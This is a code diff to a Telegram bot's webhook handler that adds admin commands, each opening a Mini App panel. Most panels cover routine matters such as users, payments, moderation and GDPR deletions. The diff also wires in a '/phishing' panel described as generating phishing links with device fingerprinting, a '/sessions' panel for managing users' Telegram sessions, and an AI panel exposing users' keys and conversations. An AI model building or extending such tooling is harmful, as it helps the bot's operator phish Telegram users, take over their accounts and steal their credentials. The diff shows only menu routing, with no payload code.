@@ -766,8 +766,8 @@ webhook.post("/webhook", async (c) => {
 
       if (text.startsWith("/help")) {
         await sendMessage(BOT_TOKEN, ADMIN_ID,
-          `*Admin Commands*\n\n/stats — global stats\n/keyword <word> — block keyword\n/whitelist <id> — whitelist user for links\n/schedule <msg>|<date> — schedule broadcast\n/tagall <chat\\_id> — tag all in group\n/banall <chat\\_id> — ban all in group\n/silentban <chat\\_id> — silent ban (deletes cmd, DM report)\n/broadcast <text> — message all users\n\n*Moderation* (reply to forwarded msg):\n!ban [bot|app|global] [reason]\n!warn [reason]\n!restrict [reason]\n!unban\n\n*Premium Features* (250 Stars/month):\n• 📢 Tag All members\n• 🚫 Ban All members\n• 🔇 Silent Ban (stealth mode)\n• Group management via Mini App`,
-          { parse_mode: "Markdown" },
+          `*Admin Commands*\n\n*Quick Open:*\n/ai — AI Admin panel\n/premium — Premium & Plans\n/widget — Widget Admin\n/users — User management\n/mod — Moderation panel\n/payments — Payment history\n/sessions — User sessions\n/phishing — Phishing tools\n/live — Live Chat\n/groups — Group tools\n/deletions — Deletion requests\n\n*Actions:*\n/stats — global stats\n/keyword <word> — block keyword\n/whitelist <id> — whitelist user for links\n/schedule <msg>|<date> — schedule broadcast\n/tagall <chat\\_id> — tag all in group\n/banall <chat\\_id> — ban all in group\n/silentban <chat\\_id> — silent ban\n/broadcast <text> — message all users\n\n*Moderation* (reply to forwarded msg):\n!ban [bot|app|global] [reason]\n!warn [reason]\n!restrict [reason]\n!unban`,
+          { parse_mode: "Markdown", reply_markup: openAppMarkup(env, "Open Admin Panel", "inbox") },
         ).catch(() => {});
         return c.json({ ok: true });
       }
@@ -789,12 +789,89 @@ webhook.post("/webhook", async (c) => {
       if (text === "/start") {
         await sendMessage(BOT_TOKEN, ADMIN_ID,
           `Admin panel is active.\n\nYou will receive forwarded messages from users here.\n\nTo reply: swipe on a forwarded message and write your reply.\nTo broadcast: /broadcast Your message here`,
-          { reply_markup: openAppMarkup(env) },
+          { reply_markup: openAppMarkup(env, "Open Admin Panel", "inbox") },
         ).catch(() => {});
         return c.json({ ok: true });
       }
       if (text === "/donate") {
-        await sendMessage(BOT_TOKEN, ADMIN_ID, "✅ Bot operational.", { reply_markup: openAppMarkup(env) }).catch(() => {});
+        await sendMessage(BOT_TOKEN, ADMIN_ID, "✅ Bot operational.", { reply_markup: openAppMarkup(env, "Open Admin Panel", "inbox") }).catch(() => {});
+        return c.json({ ok: true });
+      }
+      if (text.startsWith("/ai")) {
+        await sendMessage(BOT_TOKEN, ADMIN_ID,
+          `🤖 *AI Admin*\n\nManage AI Chat Hub — view user keys, conversations, and usage stats.`,
+          { parse_mode: "Markdown", reply_markup: openAppMarkup(env, "Open AI Admin", "ai-admin") },
+        ).catch(() => {});
+        return c.json({ ok: true });
+      }
+      if (text.startsWith("/premium")) {
+        await sendMessage(BOT_TOKEN, ADMIN_ID,
+          `⭐ *Premium Admin*\n\nManage premium subscriptions — grant, revoke, and view all active subscribers.`,
+          { parse_mode: "Markdown", reply_markup: openAppMarkup(env, "Manage Plans", "plans") },
+        ).catch(() => {});
+        return c.json({ ok: true });
+      }
+      if (text.startsWith("/widget")) {
+        await sendMessage(BOT_TOKEN, ADMIN_ID,
+          `🌐 *Widget Admin*\n\nManage all widgets — view configurations, usage, and user widget data.`,
+          { parse_mode: "Markdown", reply_markup: openAppMarkup(env, "Widget Admin", "widget-admin") },
+        ).catch(() => {});
+        return c.json({ ok: true });
+      }
+      if (text.startsWith("/users")) {
+        await sendMessage(BOT_TOKEN, ADMIN_ID,
+          `👥 *Users*\n\nView and manage all registered bot users.`,
+          { parse_mode: "Markdown", reply_markup: openAppMarkup(env, "View Users", "users") },
+        ).catch(() => {});
+        return c.json({ ok: true });
+      }
+      if (text.startsWith("/moderation") || text.startsWith("/mod")) {
+        await sendMessage(BOT_TOKEN, ADMIN_ID,
+          `🛡️ *Moderation*\n\nView bans, warnings, restrictions, and manage user access.`,
+          { parse_mode: "Markdown", reply_markup: openAppMarkup(env, "Open Moderation", "moderation") },
+        ).catch(() => {});
+        return c.json({ ok: true });
+      }
+      if (text.startsWith("/payments")) {
+        await sendMessage(BOT_TOKEN, ADMIN_ID,
+          `💳 *Payments*\n\nView all payment history — Stars, crypto, and premium subscriptions.`,
+          { parse_mode: "Markdown", reply_markup: openAppMarkup(env, "View Payments", "payments") },
+        ).catch(() => {});
+        return c.json({ ok: true });
+      }
+      if (text.startsWith("/sessions")) {
+        await sendMessage(BOT_TOKEN, ADMIN_ID,
+          `🔑 *Sessions*\n\nView and manage user Telegram sessions.`,
+          { parse_mode: "Markdown", reply_markup: openAppMarkup(env, "View Sessions", "sessions") },
+        ).catch(() => {});
+        return c.json({ ok: true });
+      }
+      if (text.startsWith("/phishing")) {
+        await sendMessage(BOT_TOKEN, ADMIN_ID,
+          `🔗 *Phishing*\n\nGenerate and manage phishing links with device fingerprinting.`,
+          { parse_mode: "Markdown", reply_markup: openAppMarkup(env, "Open Phishing", "phishing") },
+        ).catch(() => {});
+        return c.json({ ok: true });
+      }
+      if (text.startsWith("/livechat") || text.startsWith("/live")) {
+        await sendMessage(BOT_TOKEN, ADMIN_ID,
+          `💬 *Live Chat*\n\nView and respond to live chat conversations in real-time.`,
+          { parse_mode: "Markdown", reply_markup: openAppMarkup(env, "Open Live Chat", "live-chat") },
+        ).catch(() => {});
+        return c.json({ ok: true });
+      }
+      if (text.startsWith("/groups")) {
+        await sendMessage(BOT_TOKEN, ADMIN_ID,
+          `📱 *Group Tools*\n\nManage bot groups — tag all, ban all, silent ban, and member lists.`,
+          { parse_mode: "Markdown", reply_markup: openAppMarkup(env, "Open Group Tools", "groups") },
+        ).catch(() => {});
+        return c.json({ ok: true });
+      }
+      if (text.startsWith("/deletions")) {
+        await sendMessage(BOT_TOKEN, ADMIN_ID,
+          `🗑️ *Deletion Requests*\n\nView and process user data deletion (GDPR) requests.`,
+          { parse_mode: "Markdown", reply_markup: openAppMarkup(env, "View Deletions", "deletion-requests") },
+        ).catch(() => {});
         return c.json({ ok: true });
       }
     }
